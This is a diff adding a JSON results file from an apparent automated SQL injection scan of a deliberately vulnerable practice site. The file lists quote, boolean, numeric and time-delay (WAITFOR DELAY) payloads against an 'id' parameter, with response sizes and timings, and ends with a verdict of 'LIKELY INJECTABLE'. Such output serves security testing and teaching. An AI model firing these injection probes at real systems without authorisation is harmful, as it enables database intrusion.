@@ -1,0 +1,80 @@
+{
+  "generated_at": "2026-11-23T19:12:42.371037+00:00",
+  "target": "http://testaspnet.vulnweb.com/Comments.aspx?id=1",
+  "raw_results": {
+    "baseline": {
+      "url": "http://testaspnet.vulnweb.com/Comments.aspx?id=1",
+      "status": 200,
+      "length": 13390,
+      "elapsed": 7.098,
+      "sql_error": false,
+      "error_snippet": null
+    },
+    "error_quote": {
+      "url": "http://testaspnet.vulnweb.com/Comments.aspx?id=1%27",
+      "status": 200,
+      "length": 0,
+      "elapsed": 0.312,
+      "sql_error": false,
+      "error_snippet": null,
+      "payload": "1'"
+    },
+    "boolean_true": {
+      "url": "http://testaspnet.vulnweb.com/Comments.aspx?id=1%27+AND+1%3D1+--+",
+      "status": 200,
+      "length": 0,
+      "elapsed": 0.232,
+      "sql_error": false,
+      "error_snippet": null,
+      "payload": "1' AND 1=1 -- "
+    },
+    "boolean_false": {
+      "url": "http://testaspnet.vulnweb.com/Comments.aspx?id=1%27+AND+1%3D2+--+",
+      "status": 200,
+      "length": 0,
+      "elapsed": 0.225,
+      "sql_error": false,
+      "error_snippet": null,
+      "payload": "1' AND 1=2 -- "
+    },
+    "time_delay": {
+      "url": "http://testaspnet.vulnweb.com/Comments.aspx?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27+--+",
+      "status": 200,
+      "length": 0,
+      "elapsed": 0.233,
+      "sql_error": false,
+      "error_snippet": null,
+      "payload": "1' WAITFOR DELAY '0:0:5' -- "
+    },
+    "numeric_true": {
+      "url": "http://testaspnet.vulnweb.com/Comments.aspx?id=1+AND+1%3D1",
+      "status": 200,
+      "length": 13400,
+      "elapsed": 5.056,
+      "sql_error": false,
+      "error_snippet": null,
+      "payload": "1 AND 1=1"
+    },
+    "numeric_false": {
+      "url": "http://testaspnet.vulnweb.com/Comments.aspx?id=1+AND+1%3D2",
+      "status": 200,
+      "length": 13400,
+      "elapsed": 5.433,
+      "sql_error": false,
+      "error_snippet": null,
+      "payload": "1 AND 1=2"
+    }
+  },
+  "analysis": {
+    "parameter": "id",
+    "original_value": "1",
+    "signals": [
+      {
+        "type": "error-based (query-breaking)",
+        "confidence": "high",
+        "detail": "single-quote injection collapsed response 13390 -> 0 bytes; the query breaks on a bare quote"
+      }
+    ],
+    "verdict": "LIKELY INJECTABLE"
+  }
+}
